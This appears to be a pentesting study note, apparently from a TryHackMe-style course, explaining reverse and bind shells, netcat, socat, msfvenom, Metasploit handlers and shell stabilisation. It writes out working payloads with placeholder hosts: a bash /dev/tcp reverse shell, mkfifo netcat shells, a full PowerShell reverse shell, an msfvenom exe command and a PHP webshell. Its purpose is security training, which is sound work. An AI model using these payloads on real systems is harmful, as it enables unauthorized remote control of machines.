# Shells
Shells are the `programs running inside the console that interpret your commands` ran on your CLI (Command-line interface). In other words, the common `bash` or `sh` programs in Linux are examples of shells, as are `cmd.exe` and `Powershell` on Windows.

When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

Most used shells: `bash`, `sh`, `cmd.exe`, `powershell.exe` & `/bin/zsh`

## Tools
1. Netcat: A networking tool commonly used for setting up listeners and reverse shells.

    Example: `nc -lvnp <PORT>` where l=listen, v=verbose, n=no reverse-DNS & p=port specification.

2. Socat: An advanced alternative to Netcat, supports encrypted connections and more protocols. Encrypted Socat shells are also possible using `OPENSSL`.

    `socat TCP-L:<PORT> -` + `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"` or `EXEC:powershell.exe,pipes`

3. Metasploit multi/handler: A superb tool for `catching reverse shells`.
4. Msfvenom: Used to generate payloads (shells).
5. Meterpreter: Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets.

Another useful set of tools:
1. `rlwrap`, a tool to wrap readline functionality for command-line utilities that lack it (e.g., netcat).
2. Python: Converting a simple shell into a fully interactive shell. `python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Types:
1. Reverse shell: We force a remote server to give us CLI access.

    Example : `rlwrap nc -lvnp 4444` (listener), `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` 

2. Bind shell: We open a port on a remote server which we can connect to in order to execute commands.

    Example: `nc -lvnp <port> -e "cmd.exe"` (target machine), `nc MACHINE_IP <port>` (attacking machine).

### Interactive vs. Non-interactive shells
1. Interactive: These allow you to interact with programs after executing them.

    Example: `Powershell, Bash, Zsh, sh` or any other standard CLI environment

2. Non-Interactive: You are limited to using programs which `do not require user interaction` in order to run properly.

    Example: Can't run `ssh` but can run `whoami`, `pwd`, etc.

### Where to find shells
1. [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
2. [Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
3. [Revshells](https://www.revshells.com/)

## Other common shell commands
| Command | Purpose |
|-|-|
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade to a fully interactive shell. |
| `export TERM=xterm` | Fix terminal display issues in a simple shell. |
| `CTRL + Z` | Background the current shell process. |
| `stty raw -echo` and `fg` | Fix line formatting issues when bringing a shell to the foreground. |
| `rlwrap nc -lvnp <PORT>` | Use `rlwrap` for history and arrow key navigation in Netcat shells. |
| `socat tcp-listen:<PORT>,reuseaddr,fork exec:/bin/bash` | Start an advanced reverse shell listener. |
| `php -r '...'` | Execute a PHP reverse shell payload. |

## Shell stabilisation
Shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors.

Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder.

### Technique 1: Python
Mostly used on Linux systems.

1. Spawn a python shell using `python -c 'import pty;pty.spawn("/bin/bash")'`.
2. Get access to term commands such as `clear` using `export TERM=xterm`.
3. Background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). `To fix this, type reset and press enter`.

### Technique 2: rlwrap
Similar to `stty`, rlwrap gives us access to history, tab autocompletion and arrow keys.  however, some manual stabilisation must still be utilised if you want to be able to use `Ctrl + C` inside the shell.

1. Invoke a slightly different listener: `rlwrap nc -lvnp <port>`.
2. Background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell.

### Technique 3: Socat
Typically to Linux systems.

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell.

1.  Transfer a [Socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)

    A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file.
    
    Or using Powershell: `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

    On Linux this would be accomplished with `curl` or `wget` (`wget <LOCAL-IP>/socat -O /tmp/socat`).

### Change your terminal tty size
With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.

Example: `stty rows <number>` & `stty cols <number>`

## Common shell payloads
### Executing a process
In netcat there is a `-e` option which allows you to execute a process on connection. For example, as a listener: `nc -lvnp <PORT> -e /bin/bash` However, this is not included in most versions of netcat as it is widely seen to be very insecure (funny that, huh?).

On Linux, we would instead use this code to create a listener for a bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`. This creates a [`named pipe`](https://www.linuxjournal.com/article/2156) at `/tmp/f` and then starts a netcat listener and connects the input of that listener to the output of the named pipe. Then the output gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`. This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

### Powershell
When targeting a modern Windows Server, it is very common to require a Powershell reverse shell:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

In order to use this, we need to replace `"<IP>"` and `"<port>"` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell.

### Msfvenom
The one-stop-shop for all things payload related. Mostly used for generating Buffer Overflow playloads, it can also generate to various formats; `.exe, .aspx, .war, .py, etc.`

For example to generate a Windows x64 Reverse Shell in .exe format: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`.

Here we are using a payload and four options:
- `-f <format>`: Specifies the output format. In this case that is an executable (exe)
- `-o <file>`: The output location and filename for the generated payload.
- `LHOST=<IP>`: Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
- `LPORT=<port>`: The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.

Before we go any further, there are another two concepts which must be introduced: `staged reverse shell payloads` and `stageless reverse shell payloads`.
- Staged payloads are sent in two parts.

    The first part is called the `stager`.
    This is a piece of code which is executed directly on the server itself.
    It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself.
    Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions.

- Stageless payloads are more common.

    `Entirely self-contained` in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.

#### Payload Naming Conventions
When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows:

- `<OS>/<arch>/<payload>`.

    For example: `linux/x86/shell_reverse_tcp`.
    
    The exception to this convention is Windows 32bit targets. For these, the arch is not specified. e.g.: `windows/shell_reverse_tcp`.

- Stageless: `shell_reverse_tcp`. Stageless payloads are denoted with underscores (`_`).
- Staged: `shell/reverse_tcp`. Staged payloads are denoted with another forward slash (`/`).

Aside from the msfconsole man page, the other important thing to note when working with msfvenom is: `msfvenom --list payloads`.

### Metasploit multi/handler
The go-to when using staged payloads.

1. Open Metasploit with msfconsole
2. Type use multi/handler, and press enter
3. Set the options needed
4. Start the listener using `exploit -j`
5. Use `sessions 1` to foreground it again.If you have more sessions running use `sessions` to get the session number. Then use `sessions <number>` to select the appropriate session to foreground.

### WebShells
There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible.

As `PHP` is still the most common server side scripting language, let's have a look at some simple code for this in a very basic one line format: 

`<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>`

As mentioned previously, there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous `PentestMonkey php-reverse-shell` -- a full reverse shell written in PHP.